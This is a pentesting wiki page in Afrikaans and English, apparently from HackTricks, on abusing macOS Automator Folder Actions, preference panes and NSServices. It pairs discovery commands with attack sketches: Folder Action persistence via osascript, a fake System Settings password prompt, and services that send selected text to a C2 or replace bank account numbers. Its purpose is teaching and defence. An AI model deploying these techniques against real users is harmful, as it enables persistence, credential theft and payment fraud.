# macOS Automator, Preference Panes & NSServices Misbruik

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basiese Inligting

**Automator** is macOS se visuele automatiseringshulpmiddel. Dit voer **workflows** (`.workflow` bundles) uit wat saamgestel is uit **actions** (`.action` bundles). Automator dryf ook **Folder Actions**, **Quick Actions**, en **Shortcuts** integrasie.

Automator actions is **plugins** wat in die Automator-runtime gelaai word wanneer 'n workflow uitgevoer word. Hulle kan:
- Voer arbitrêre shell-skripte uit
- Verwerk lêers en data
- Interageer met toepassings via AppleScript
- Kan aan mekaar gekoppel word vir komplekse automatisering

### Waarom dit saak maak

> [!WARNING]
> Automator workflows kan via **social-engineered** hanteer word om uitgevoer te word — hulle voorkom as eenvoudige dokumentlêers. 'n `.workflow` bundle kan ingebedde shell-opdragte bevat wat uitgevoer word wanneer die workflow loop. Gekombineer met Folder Actions, bied hulle **outomatiese persistering** wat op lêergebeure getrigger word.

### Ontdekking
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Aanval: Sosiaal-geënsceneerde Werkstroom

'n `.workflow` bundel lyk vir die meeste gebruikers soos 'n normale dokumentlêer:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions voer outomaties 'n workflow uit wanneer lêers by 'n bewaakte gids gevoeg word:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions bly oor herlaai en voer stilweg uit. 'n Folder Action op `~/Downloads` beteken **elke afgelaaide lêer aktiveer jou payload** — insluitend lêers vanaf Safari, Chrome, AirDrop, en e-pos-aanhangsels.

---

## Preference Panes

### Basiese Inligting

Preference panes (`.prefPane` bundles) is plugins wat in **System Settings** (voorheen System Preferences) gelaai word. Hulle voorsien konfigurasie UI-panele vir stelsel- of derdeparty-funksies.

### Waarom dit saak maak

- Preference panes voer binne die **System Settings-proses** uit, wat moontlik **verhoogde TCC-permissies** het (accessibility, full disk access in sommige kontekste)
- Third-party preference panes word in hierdie betroubare proses gelaai en **erf sy sekuriteitskonteks**
- Gebruikers installeer preference panes deur dit te **dubbelklik** — maklike social engineering
- Sodra geïnstalleer, bly dit bestaan en word dit elke keer gelaai wanneer System Settings na daardie paneel oopgemaak word

### Ontdekking
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Aanval: Privilege Context Hijacking

'n kwaadwillige voorkeurpaneel erf System Settings se sekuriteitskonteks:
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside System Settings process
// It has System Settings' TCC permissions

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Aanval: Persistence via Installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Aanval: UI Phishing

'n voorkeurpaneel kan legitieme stelsel UI-panele naboots om te **phish for credentials**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basiese Inligting

**NSServices** allow applications to provide functionality to other apps through the **Services menu** (regsklik → Services). Wanneer 'n gebruiker teks of data selekteer en 'n diens aktiveer, word die geselekteerde data **na die diensverskaffer gestuur** vir verwerking.

Dienste word in 'n toepassing se `Info.plist` verklaar onder die `NSServices` sleutel en by die pasteboard server (`pbs`) geregistreer.

### Hoekom dit saak maak

- Dienste ontvang **kruis-toepassing datavloei** — geselekteerde teks van enige toepassing word na die diens gestuur
- 'n Kwaadwillige diens vang data op van wagwoordbestuurders, e-poskliente, finansiële toepassings
- Dienste kan **gewysigde data terugstuur** na die aanroepende toepassing (man-in-the-middle op seleksie-operasies)
- Diensname kan so ontwerp word dat dit legitiem voorkom ("Format Text", "Encrypt Selection", "Share")

### Ontdekking
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Aanval: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Aanval: Data-wysiging (Man-in-the-Middle)

'n diens kan **die teruggegewe data wysig** terwyl dit voorkom asof dit 'n legitieme funksie bied:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
---

## Kruis-tegniek Aanvalskettings

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Voorkeurpaneel → TCC-eskalering
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane runs inside System Settings context
4. Inherits System Settings' TCC grants
5. Access protected data, control other apps via inherited Accessibility
```
### NSService → Diefstal van wagwoordbestuurders
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Verwysings

* [Apple Developer — Automator Programming Guide](https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Automator.html)
* [Apple Developer — Preference Pane Programming Guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/PreferencePanes/Introduction/Introduction.html)
* [Apple Developer — Services Implementation Guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/SysServices/introduction.html)
* [Objective-See — Folder Action Persistence](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
